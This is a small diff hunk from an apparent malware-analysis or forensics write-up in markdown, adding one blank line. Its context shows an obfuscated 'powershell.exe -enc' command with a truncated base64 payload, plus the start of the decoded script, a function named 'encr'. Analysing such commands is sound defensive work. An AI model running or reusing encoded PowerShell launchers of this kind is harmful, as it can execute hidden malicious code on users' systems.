@@ -16,6 +16,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc ZgB1AG4AYwB0AGkAb
 
 Since -enc takes a base64 encoded input, I ran this snippet on a base64 decoder and got the following powershell code
 <details><summary>powershell code</summary>
+
 ```
 function encr {
     param(
